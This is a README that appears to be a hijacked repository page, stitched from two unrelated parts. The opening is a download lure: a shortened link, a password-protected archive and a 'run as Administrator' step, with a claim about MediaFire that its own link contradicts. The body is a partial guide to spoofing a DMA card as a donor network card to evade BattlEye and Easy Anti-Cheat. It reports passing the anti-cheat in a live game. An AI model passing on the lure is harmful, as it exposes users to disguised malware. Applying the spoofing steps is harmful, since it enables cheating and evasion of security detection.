<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Key Skills Demonstrated
- **Firmware Development:** Customized and modified firmware to achieve specific objectives.
- **Hardware Manipulation:** Leveraged FPGA technology to simulate different hardware configurations.
- **Cybersecurity:** Implemented advanced techniques to prevent detection by sophisticated anti-cheat systems.
- **Project Management:** Documented the project comprehensively, ensuring reproducibility and clarity.

#
#
## Purpose
#### Strategic Rationale
Focusing on evading anti-cheat systems like BattleEye (BE) and Easy Anti-Cheat (EAC) mirrors the complexity and organization of sophisticated hacking groups. These systems are developed by intelligent professionals and are highly funded, making them ideal testing grounds for advanced evasion techniques. Successfully bypassing such strong detection mechanisms not only highlights technical expertise but also provides valuable insights that can be applied to broader cybersecurity applications. By tackling these challenges, this project demonstrates customization of DMA firmware, expertise in hardware manipulation, and advanced cybersecurity skills—highly valuable in the tech industry and relevant to defending against equally well-funded, malicious entities.

## Software and Hardware List
- Hardware:
## Project Details
### What is the project?
This project is a hardware obfuscation simulation. Hardware obfuscation is an effective cybersecurity technique that hides the true nature of high-priority hardware by disguising it as lower-priority hardware.

### Why is hardware obfuscation effective in Cybersecurity?
Attackers often prioritize targeting high-value hardware. By disguising such hardware as low-value, the likelihood of detection is reduced, effectively stalling attackers.

#### Examples of High-Value Hardware:
- **Servers:** Critical for hosting applications, databases, and sensitive information. Targeting these can lead to significant data breaches and disruptions.
- **Network Routers and Switches:** Central to the infrastructure, compromising these can provide access to a vast amount of network traffic and control.

#### Examples of Low-Value Hardware:
- **Printers:** Commonplace and often overlooked, making them ideal candidates for disguising high-value assets.
- **Scanners:** Similar to printers, these are not typically seen as high-value targets but are prevalent in many environments.

### Advantages of Hardware Obfuscation:
- **Reduced Detection Risk:** By masking high-value assets, the chances of them being targeted are significantly reduced.
- **Increased Attack Complexity:** Attackers must spend more time and resources to identify and target valuable assets, increasing the likelihood of detection and intervention.
- **Strategic Deception:** Creating a false sense of security for attackers can lead them into traps, such as honeypots, where their activities can be monitored and analyzed.

### Potential Applications:
- **Corporate Networks:** Protecting critical servers and databases within a corporate network by disguising them as less critical devices.
- **Industrial Systems:** Securing industrial control systems and critical infrastructure by masking them as standard IT equipment.
- **Financial Institutions:** Safeguarding transaction processing systems by making them appear as non-essential office devices.
- **Government and Defense:** Enhancing the security of sensitive systems and communication networks by using hardware obfuscation techniques.


#
#
# The Project

## 1. Introduction information:
#### 35T
This project will be using a ```35T: Squirrel``` device. 75T and 100T devices will be different!
#### Why RTL8111?
I will also be using the RTL8111 as a 'donor card'. A <ins>donor card</ins> refers to the physical device I'll pull legitimate IDs off of. The donor cards information will be put onto the DMA card. Using a real network card will ensure my IDs are all accurate.
####
#### Base Registry Address (BAR)
Note the size for your base registry addresses (BARs) by clicking on BAR0 to BAR5. A BAR set to '00 00 00 00' is a special bar. The 0's indicate that this specific BAR is not used on the RTL8111.

## 3. Enabling Master Abort Handling for Enhanced Error Detection

Set the master abort flag to ```1``` in ```pcileech-fpga-4.15\PCIeSquirrel\src``` in the ```pcileech_pcie_cfg_a7.sv``` file because it helps catch invalid memory accesses during DMA transactions, which would otherwise go unnoticed if set to 0. This allows for easier debugging if there is an issue with the custom firmware. Detecting and addressing any misconfigurations or failed transactions later on (if there are any) will be easier to manage. Without this change, you risk missing critical errors that could compromise the DMA firmware functionality. This is a safeguard. Do not skip this step.

## 4. Setting the DSN

In the same file, copy the DSN value into the ```rw[127:64]``` line. This line is for the cfg_dsn. There are 16 avalible characters in this section. Be sure to copy the ```Lower DW``` over top of the first 8 numbers and copy the ```Upper DW``` into the second 8 numbers like shown:

    rw[127:64]  <= 64'h684CE00051140000;    // +008: cfg_dsn

```684CE000``` and ```51140000``` are our Lower and Upper DWs.

Save ```pcieleech_pcie_cfg_a7.sv```.

## 5. Vivado

#### Open
Vivado is what I will be using to create my ```pcileech_squirrel.xpr``` file. Be sure to know exactly where your ```PCIeSquirrel``` folder is. Mine is in ```M:\CUSTOM FW\pcileech-fpga-4.15\PCIeSquirrel```, so I will ```cd``` into that location and run ```source vivado_generate_project.tcl -notrace``` to build. 

```cd``` into your ```PCIeSquirrel```:
#### IDs
We will now write in the IDs we saved before into the tab ```IDs```.

#### BARs
Navigate to the BARs tab. BARs ```0``` and ```1``` are each 32 bit BARs becasue they contain a single BAR each. BARs ```2```, and ```4``` are 64 bit BARs because they contain two total BARs each. I/O BARs are always 32 bit. Do not enable BARs ```1```, ```3```, and ```5``` because they are unused BARs. We know this because they are hard coded to all ```0```s. BAR ```3``` is part of BAR ```2``` so do not enable BAR ```3```. Likewise, BAR ```5``` is part of BAR ```4``` so do not enable BAR ```5```. All 64 bit BARs will carry into the next BAR, so do not enable the 2nd half of each 64 bit BAR. Update the BARs:

#### MSI-X Capability Structure

This part is slightly different.

1. PCIE_BASE_PTR: Set to 0x40, which is where the PCI Express capability structure is located.

Line 292:

    parameter [7:0]   PCIE_BASE_PTR = 8'h40,

2. PCIE_CAP_NEXTPTR: Set to 0xC8, which is where the next capability, Power Management, is located.

Line 164:

    parameter [7:0]   PCIE_CAP_NEXTPTR = 8'hC8,

3. PM_BASE_PTR: Set to 0xC8, which is the offset for Power Management capability.

Line 309:

    parameter [7:0]   PM_BASE_PTR = 8'hC8,

4. PM_CAP_NEXTPTR: Set to 0xD0, pointing to the MSI-X structure at offset 0xD0.

Line 169:

    parameter [7:0]   PM_CAP_NEXTPTR = 8'hD0,

5. MSI_BASE_PTR: Set to 0xD0, the location of the MSI-X capability.

Line 280:

    parameter [7:0]   MSI_BASE_PTR = 8'hD0,

6. MSI_CAP_NEXTPTR: Set to 0x00, indicating the end of the capability chain.

Line 282:

    parameter [7:0]   MSI_CAP_NEXTPTR = 8'h00,

7. CAPABILITIES_PTR: The starting point of the capabilities list is set to 0x40, which is the offset for the PCIe capability

Line 359:

    parameter [7:0]   CAPABILITIES_PTR = PCIE_BASE_PTR,


This will link the capability structures in the configuation space based on the offsets and pointers. 

Save your work so far.

## 6. Building

This will take a while to run. It took around 10 minutes on my 10600KF + 3070 PC.

## 7. Testing

#### DMA Card Functionality Check
Connect your second PC (Attack PC) to the PC with the DMA Card installed.

insert pic of my DMA card plugged in

insert image of my Laptop plugged in

## 8. Testing My Firmware Against BattleEye Anti Cheat

DMA cards are forbidden to be plugged into your computer when launching a game equiped with BattleEye Anti Cheat. You will be banned immediately along with your hardware IDs logged on a blacklist. Do not try this part of the guide unless your firmware's configuration space does NOT resemble your vanilla card. I have altered my configuration space, however that is out of the scope of this project. I might go over this later, however if you are reading this note, it is not currently written in this guide. Do this next part at your own risk.

I will be testing on PlayerUnknown's Battlegrounds because it's a free online game that uses BattleEye anti cheat.

#### Firmware Pass Check

I have no issues logging into the game.

# Conclusion

This project was a success. I will keep the status of my firmware up to date here. When this method no longer works, I will update this section.

As of my last check on 10/21/2026, this method passes and works.

#
## Glossary

- **DMA (Direct Memory Access)**: A method that allows hardware devices to access the system memory directly, bypassing the CPU, making it faster for data transfers.

- **FPGA (Field-Programmable Gate Array)**: A type of programmable hardware used for a variety of tasks, including simulating different hardware configurations, like network cards in this project.

- **PCIe (Peripheral Component Interconnect Express)**: A high-speed interface standard used to connect hardware devices, like GPUs or network cards, to the motherboard.

- **BAR (Base Address Register)**: A register that holds the memory or I/O address space allocated to a device, crucial for interacting with the device during PCIe transactions.

- **DSN (Device Serial Number)**: A unique identifier assigned to a hardware device, used for identification during PCIe transactions.

- **TLP (Transaction Layer Packet)**: A type of data packet used in PCIe communication for transmitting data between devices and memory.

- **AER (Advanced Error Reporting)**: A PCIe feature that provides detailed information about errors, improving diagnostics and troubleshooting.

- **VC (Virtual Channel)**: A capability structure in PCIe that allows multiple independent data paths or virtual channels to share the same physical link.

- **Master Abort**: An error condition that occurs when a device attempts to access an invalid memory location or a device that doesn’t respond. Enabling master abort handling allows these errors to be detected and logged.

- **BE (BattleEye)**: An anti-cheat software used in games to detect unauthorized modifications, including DMA-based cheating methods.

- **EAC (Easy Anti-Cheat)**: Another popular anti-cheat system designed to prevent hacking and cheating in online games.

- **Donor Card**: A physical hardware device used to extract IDs and configuration data for creating modified firmware to simulate another device.


# Note
This project is for EDUCATIONAL PURPOSES ONLY. Using this project outside of a purely educational context is not allowed. This project is to teach me a Cybersecurity strategy for detection prevention only. Following this guide assumes you understand the risks involved as it includes rewriting critical firmware files that can brick your hardware. Any firmware manipulation can lead to bricking. Consider this a warning! Follow the steps as they appear ONLY.


---

MIT License

Copyright (c) 2024 Ryan Livinghouse

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
